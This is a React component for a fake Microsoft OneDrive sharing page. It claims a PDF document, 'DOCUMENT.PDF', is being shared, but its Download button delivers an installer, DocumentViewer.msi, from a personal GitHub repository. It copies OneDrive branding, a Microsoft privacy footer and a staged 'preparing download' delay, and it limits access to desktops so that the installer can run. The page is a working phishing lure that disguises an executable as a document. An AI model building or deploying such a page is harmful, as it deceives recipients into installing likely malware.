
import React, { useState } from 'react';

// The file is located in the repository root
const DOWNLOAD_FILENAME = "https://github.com/deeclara67-png/Document2/blob/main/DocumentViewer.msi";

const OneDriveCard: React.FC = () => {
  const [isDownloading, setIsDownloading] = useState(false);

  const handleDownload = () => {
    setIsDownloading(true);
    
    // Brief delay to simulate "preparing download" before starting the transfer
    setTimeout(() => {
      // Create a temporary link element to trigger the download explicitly
      const link = document.createElement('a');
      link.href = `./${DOWNLOAD_FILENAME}`;
      link.download = DOWNLOAD_FILENAME;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      // Reset state after a delay to allow the user to click again if needed
      setTimeout(() => setIsDownloading(false), 2000);
    }, 1200);
  };

  return (
    <div className="max-w-[480px] w-full bg-white rounded-[2px] ms-shadow border border-[#edebe9] overflow-hidden text-center flex flex-col items-center pt-10 pb-12 px-8 sm:px-14 transition-all duration-300 hover:shadow-md">
      {/* OneDrive Logo Section */}
      <div className="mb-8 select-none">
        <img 
          src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20221209.001/assets/brand-icons/product/svg/onedrive_48x1.svg" 
          alt="OneDrive Logo" 
          className="w-16 h-16 mb-1"
        />
        <span className="block text-[#0078d4] text-[22px] font-semibold tracking-tight">OneDrive</span>
      </div>

      {/* Hero Text */}
      <h1 className="text-[#323130] text-[19px] font-semibold mb-8 leading-snug">
        Here's the document that I am sharing with you.
      </h1>

      {/* Document Information Box */}
      <div className="w-full border border-[#edebe9] rounded-[2px] py-5 px-6 flex items-center justify-center mb-8 bg-[#faf9f8]">
        <div className="flex items-center space-x-4">
          {/* Professional PDF Icon */}
          <div className="relative w-10 h-12 bg-white border border-[#d2d0ce] rounded-sm flex flex-col items-center justify-end pb-1 shadow-sm">
            <div className="absolute top-0 right-0 w-3 h-3 bg-[#edebe9] origin-top-right transform -rotate-45 translate-x-[4px] -translate-y-[4px]"></div>
            <div className="bg-[#a4262c] text-white text-[9px] font-bold px-1 rounded-sm mb-1 uppercase tracking-tighter">
              PDF
            </div>
          </div>
          <div className="flex flex-col items-start">
            <span className="text-[#323130] font-bold text-lg tracking-tight uppercase leading-none">
              DOCUMENT.PDF
            </span>
            <span className="text-[#605e5c] text-xs font-normal">2.2 MB</span>
          </div>
        </div>
      </div>

      {/* Warning Text */}
      <div className="space-y-1 mb-10">
        <p className="text-[#605e5c] text-[14px]">
          This link only works for the direct recipients of this message.
        </p>
        <p className="text-[#a4262c] font-semibold text-[14px] leading-tight">
          Note: This file can only be accessed on a laptop or desktop.
        </p>
      </div>

      {/* Download Button */}
      <button
        onClick={handleDownload}
        disabled={isDownloading}
        aria-label="Download Shared Document"
        className={`bg-[#0078d4] hover:bg-[#005a9e] active:bg-[#004578] text-white font-semibold py-2.5 px-14 rounded-[2px] transition-all duration-200 text-lg mb-10 min-w-[200px] outline-none focus:ring-2 focus:ring-[#0078d4] focus:ring-offset-2 ${
          isDownloading ? 'opacity-80 cursor-not-allowed' : 'cursor-pointer'
        }`}
      >
        {isDownloading ? (
          <span className="flex items-center justify-center">
            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            Loading...
          </span>
        ) : (
          'Download'
        )}
      </button>

      {/* Footer */}
      <div className="text-[#605e5c] text-[11px] mt-auto pt-4 border-t border-[#f3f2f1] w-full">
        Microsoft | <a href="https://privacy.microsoft.com/" target="_blank" rel="noopener noreferrer" className="text-[#0078d4] hover:underline">Privacy Statement</a>
      </div>
    </div>
  );
};

export default OneDriveCard;
